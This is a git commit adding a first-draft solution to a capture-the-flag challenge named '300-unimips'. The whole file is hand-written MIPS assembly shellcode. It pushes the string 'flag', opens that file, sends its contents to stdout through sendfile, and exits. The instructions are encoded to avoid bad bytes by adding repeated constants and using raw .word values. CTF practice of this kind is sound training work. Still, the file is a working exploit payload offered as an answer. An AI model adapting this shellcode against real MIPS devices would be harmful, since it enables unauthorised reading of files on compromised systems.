76733a7e00b240dd791455e8c4ea02027f3ff90a
nobody <nobody@mail>
2017-09-03 14:11:20 -0700

    first draft shellcode solution

---
+++ shellcode/300-unimips/solution/shellcode.asm
@@ -0,0 +1,45 @@
+    /* push 'flag\x00' */
+    li $t1, 0x67616c66
+    /*sw $t1, 0x84f0($sp) #after add:   sp
+    sw $zero, 0x80f0($sp) #after add: sp+4
+    addiu $sp, $sp, 0x80f0*/
+    .word 0xafa9e170
+    .word 0xafa0e174
+    addiu $sp, $sp, 0x84e4
+    /* open(file='$sp', oflag=0, mode=0) */
+    addiu $v1, $sp, 0x84e4 /* mov $a0, $sp */
+    addiu $v1, $v1, 0x3655
+    addiu $v1, $v1, 0x3655
+    addiu $v1, $v1, 0x357f
+    addiu $a0, $v1, 0x357f
+    slti $a1, $zero, 0x80d0 /* $a1 = 0 */
+    slti $a2, $zero, 0x80d0 /* $a2 = 0 */
+    /* call open() */
+    /*SYS_open = 0xfa5 */
+    slti $v0, $zero, 0x80d0 /* $v0 = 0 */
+    addi $v0, $v0, 0x42e
+    addi $v0, $v0, 0x42e
+    addi $v0, $v0, 0x42e
+    addi $v0, $v0, 0x31b
+    syscall 0x40404
+    /* sendfile(out_fd=1, in_fd='$v0', offset=0, count=2147483647) */
+    /*li $t9, ~1*/
+    /*not $a0, $t9*/
+    slti $a0, $zero, 0x101 /* $a0 = 1 */
+    /*sw $v0, 0x101($sp)*/ /* mov $a1, $v0 */
+    .word 0xafa280f4 
+    /*lw $a1, 0x101($sp)*/
+    .word 0x8fa580f4 
+    slti $a2, $zero, 0x80d0 /* $a2 = 0 */
+    li $a3, 0x7070
+    /* call sendfile() */
+    ori $v0, $zero, SYS_sendfile
+    syscall 0x40404
+    /* exit(status=0) */
+    slti $a0, $zero, 0x80d0 /* $a0 = 0 */
+    /* call exit() */
+    /*SYS_exit = 0xfa1 */
+    slti $v0, $zero, 0x80d0 /* $v0 = 0 */
+    /*xori $v0, $v0, 0x8fc1*/
+    /*xori $v0, $v0, 0x1060*/
+    syscall 0x40404
